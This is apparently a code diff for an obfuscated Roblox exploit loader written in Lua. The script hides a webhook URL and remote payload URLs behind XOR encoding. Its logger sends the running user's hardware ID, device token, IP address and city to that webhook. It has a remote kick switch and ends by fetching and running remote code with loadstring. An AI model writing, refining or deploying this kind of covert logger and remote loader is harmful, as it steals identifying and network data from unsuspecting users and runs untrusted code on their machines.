@@ -13,19 +13,19 @@ local Config = {
     BL = { UIDs = {}, HWIDs = {}, Keys = {} }
 }
 
-local function _D(h, k)
-    local s = ""
-    for i = 1, #h, 2 do s = s .. string.char(bit32.bxor(tonumber(h:sub(i, i+1), 16), k)) end
-    return s
+local function _D(d, k)
+    local r = ""
+    for i = 1, #d do r = r .. string.char(bit32.bxor(d[i], k)) end
+    return r
 end
 
-local _0xK = 0xAF
-local _W = _D("C7C9D3D4D0958584CEC4D3CECDD9D087CDD8D18C9D8681889D8FD590929F99989B94D1D4D7D2D6DDDED6D9DDCAD8DED0D9D994D0DBDC97DCDEDADEDAD7C9D696DEDCDFD7C9D6C99596D3C9DCDEDADEDAD7C9D6CDDCDFD7C9DBDFCDDCD19BCCDADFCD", _0xK)
-local _IP = _D("C7C9D3D48F958584DDD681CDC9D294D0DDC9CD87DDC7DEDCDD9BDCCDC9CFC8C9CDC7D09BCAD8DED0D9D99BCED6D3D9DDCAD8DE", _0xK)
-local _E1 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3DAD2DCCCD6DBD9D082D9D6D3D5D9DDC9CFC8C9CDC782DCCBCAD6D282DCCBCAD681D3DAD2", _0xK)
-local _E2 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3C9DCCBD0DAD2DCCCD6D9CBCADCDD82CEC9CDDCCBDBCDCACCD0C9D8CDDCDD82DCCBCAD682D3D0DAD7C9D4", _0xK)
-local _E3 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3CACECEC9C6DE82CDC9DCCBDCDDCEC9D6DEC9DCCBDCDD82CDDAD3CEC9D282D3D0DAD7C9D4", _0xK)
-local _E4 = _D("C7C9D3D4D0958584DDCFC286CDC9D7D6D9CBCACCD0CBCACCD9DDCBC3DAD2DCCCD6DBD9D082CDC9DCCBCEC9CDD0D282DCCBCAD682CDC9DCCBCEC9CDD0D281D3DAD2", _0xK)
+local _0xK = 122
+local _W = _D({22, 6, 6, 10, 3, 80, 2, 2, 8, 27, 21, 11, 26, 10, 10, 85, 25, 10, 12, 81, 1, 14, 12, 91, 75, 11, 9, 2, 10, 13, 1, 4, 83, 80, 93, 86, 95, 91, 84, 76, 75, 84, 75, 78, 74, 85, 70, 71, 84, 72, 70, 74, 78, 74, 78, 74, 76, 73, 80, 85, 78, 85, 85, 74, 14, 15, 73, 2, 12, 1, 1, 10, 13, 84, 2, 10, 1, 1, 12, 1, 2, 3, 15, 2, 8, 1, 3, 2, 10, 11, 13, 1, 8, 1, 3, 1, 11, 25, 15, 2, 14, 1, 2, 1, 11, 15, 2, 1, 11, 13, 11, 3, 2, 3, 8, 11, 1, 2, 3, 8, 11, 13, 1, 8, 1, 3}, _0xK)
+local _IP = _D({22, 6, 6, 10, 80, 2, 2, 15, 10, 84, 1, 14, 15, 83, 1, 11, 12, 81, 12, 2, 1, 1, 13, 15, 12, 10}, _0xK)
+local _E1 = _D({22, 6, 6, 10, 3, 80, 2, 2, 14, 25, 21, 84, 11, 15, 3, 10, 20, 21, 2, 10, 3, 2, 10, 1, 8, 11, 13, 15, 2, 84, 14, 1, 10, 3, 11, 25, 15, 84, 14, 1, 11, 84, 11, 1, 15, 11, 84, 1, 1, 11, 23, 8, 12, 1, 1, 3, 84, 14, 1, 10}, _0xK)
+local _E2 = _D({22, 6, 6, 10, 3, 80, 2, 2, 14, 25, 21, 84, 11, 15, 3, 10, 20, 21, 2, 10, 3, 2, 10, 1, 8, 11, 13, 15, 2, 84, 2, 13, 14, 10, 3, 14, 11, 10, 11, 2, 14, 1, 1, 2, 10, 84, 22, 1, 11, 1, 14, 1, 1, 15, 1, 11, 13, 12, 11, 2, 84, 11, 1, 1, 14, 1, 1, 3, 84, 3, 1, 3, 14, 1, 11}, _0xK)
+local _E3 = _D({22, 6, 6, 10, 3, 80, 2, 2, 14, 25, 21, 84, 11, 15, 3, 10, 20, 21, 2, 10, 3, 2, 10, 1, 8, 11, 13, 15, 2, 84, 21, 8, 11, 1, 1, 2, 25, 1, 84, 11, 10, 2, 11, 10, 11, 10, 1, 11, 1, 1, 13, 12, 10, 11, 84, 11, 1, 3, 10, 1, 14, 84, 3, 1, 3, 14, 1, 11}, _0xK)
+local _E4 = _D({22, 6, 6, 10, 3, 80, 2, 2, 14, 25, 21, 84, 11, 15, 3, 10, 20, 21, 2, 10, 3, 2, 10, 1, 8, 11, 13, 15, 2, 84, 14, 1, 10, 3, 11, 25, 15, 84, 11, 10, 2, 1, 13, 11, 11, 1, 84, 11, 1, 1, 14, 1, 1, 84, 11, 10, 2, 1, 13, 11, 11, 1, 10, 8, 1, 3, 2}, _0xK)
 
 local _P = game:GetService("Players")
 local _H = game:GetService("HttpService")
@@ -51,13 +51,10 @@ end
 local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")
 
 local function _GUNC()
-    local u, s = 0, 0
+    local u = 0
     local tu = {"getgenv", "getrawmetatable", "hookmetamethod", "hookfunction", "setreadonly", "getnamecallmethod"}
-    local ts = {"gethui", "setthreadidentity", "getthreadidentity"}
-    local env = (getgenv and getgenv()) or getfenv(0)
-    for _, f in ipairs(tu) do if env[f] then u = u + 1 end end
-    for _, f in ipairs(ts) do if env[f] then s = s + 1 end end
-    return string.format("UNC: %d%% | sUNC: %d%%", math.floor((u/6)*100), math.floor((s/3)*100))
+    for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
+    return math.floor((u/6)*100).."%"
 end
 
 local function _GF()
@@ -86,30 +83,17 @@ local function _LOG()
         local friends = {}
         for _, p in ipairs(_P:GetPlayers()) do if p ~= _lp and _lp:IsFriendsWith(p.UserId) then table.insert(friends, p.Name) end end
         
-        local jid = game.JobId == "" and "Unknown" or game.JobId
-        local joinUrl = "N/A"
-        pcall(function()
-            local res = req({Url = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid, Method = "GET"})
-            if res and res.Success then joinUrl = res.Body end
-        end)
-
         local payload = {
             ["embeds"] = {{
-                ["title"] = (_st == "whitelist" and "✅ Whitelisted User Executed" or "👤 Unknown/Guest User Executed"),
-                ["color"] = (_st == "whitelist" and 0x00FF00 or 0xFFA500),
+                ["title"] = (_st == "whitelist" and "✅ Whitelisted" or "👤 Unknown Execution"),
+                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                 ["fields"] = {
-                    {["name"] = "Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", _lp.DisplayName, _lp.Name, _uid, tostring(_lp.AccountAge)), ["inline"] = false},
-                    {["name"] = "Executor", ["value"] = (identifyexecutor and identifyexecutor() or "Unknown") .. " (" .. _GUNC() .. ")", ["inline"] = true},
-                    {["name"] = "System", ["value"] = "**Platform:** " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
-                    {["name"] = "Faction", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", ft, fn), ["inline"] = false},
-                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
-                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
-                    {["name"] = "Network", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**VPN/Proxy:** %s\n**Location:** %s, %s\n**Timezone:** %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A", ni.timezone or "N/A"), ["inline"] = false},
-                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, jid), ["inline"] = false},
-                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
-                    {["name"] = "Links", ["value"] = "[Click to Join Server]("..joinUrl..") | [Profile](https://www.roblox.com/users/".._uid.."/profile)", ["inline"] = false}
+                    {["name"] = "Player Info", ["value"] = string.format("Name: %s (@%s)\nID: %s", _lp.DisplayName, _lp.Name, _uid), ["inline"] = true},
+                    {["name"] = "Executor", ["value"] = (identifyexecutor and identifyexecutor() or "Unknown").." (".._GUNC()..")", ["inline"] = true},
+                    {["name"] = "Faction", ["value"] = string.format("[%s] %s", ft, fn), ["inline"] = false},
+                    {["name"] = "Hardware", ["value"] = "HWID: `".._hw.."`\nKey: `".._tk.."`", ["inline"] = false},
+                    {["name"] = "Network", ["value"] = string.format("IP: %s\nLoc: %s, %s", ni.query or "N/A", ni.country or "N/A", ni.city or "N/A"), ["inline"] = false}
                 },
-                ["footer"] = {["text"] = "Logger | "..string.upper(_st).." • "..os.date("%x %I:%M %p")},
                 ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
         }
@@ -123,36 +107,31 @@ local _SIG = _R:FindFirstChild("NK_Signal") or Instance.new("StringValue", _R)
 _SIG.Name = "NK_Signal"
 local _PDIR = _R:FindFirstChild("NK_Presence") or Instance.new("Folder", _R)
 _PDIR.Name = "NK_Presence"
-local _PRES = Instance.new("StringValue", _PDIR)
-_PRES.Name = _lp.Name
+local _PR = Instance.new("StringValue", _PDIR)
+_PR.Name = _lp.Name
 
 _SIG.Changed:Connect(function(v)
-    if v == "all" or v == _lp.Name or v == _uid or v == _tk then _lp:Kick("Access Revoked.") end
+    if v == "all" or v == _lp.Name or v == _uid or v == _tk then _lp:Kick("Access Terminated.") end
 end)
 
 if _st == "whitelist" then
     local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
     local f = Instance.new("Frame", sg)
-    f.Size = UDim2.new(0, 220, 0, 300); f.Position = UDim2.new(0.5,-110,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
+    f.Size = UDim2.new(0, 220, 0, 300); f.Position = UDim2.new(0.5, -110, 0.5, -150)
+    f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Active = true; f.Draggable = true; f.Visible = false
     Instance.new("UICorner", f)
-    
     local s = Instance.new("ScrollingFrame", f)
-    s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
-    Instance.new("UIListLayout", s).Padding = UDim.new(0,5)
-
+    s.Size = UDim2.new(1, -10, 1, -20); s.Position = UDim2.new(0, 5, 0, 10); s.BackgroundTransparency = 1
+    Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
     local function refresh()
-        for _,v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
-        for _,p in ipairs(_P:GetPlayers()) do
+        for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
+        for _, p in ipairs(_P:GetPlayers()) do
             local b = Instance.new("TextButton", s)
-            b.Size = UDim2.new(1,0,0,30); b.Text = p.Name; b.BackgroundColor3 = Color3.fromRGB(40,40,45); b.TextColor3 = Color3.new(1,1,1)
-            b.MouseButton1Click:Connect(function()
-                _SIG.Value = p.Name
-                task.wait(0.1)
-                _SIG.Value = ""
-            end)
+            b.Size = UDim2.new(1, 0, 0, 30); b.Text = p.Name
+            b.MouseButton1Click:Connect(function() _SIG.Value = p.Name task.wait(0.1) _SIG.Value = "" end)
         end
     end
-    _U.InputBegan:Connect(function(k,g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
+    _U.InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
 end
 
 pcall(function() loadstring(game:HttpGet(_E1))() end)
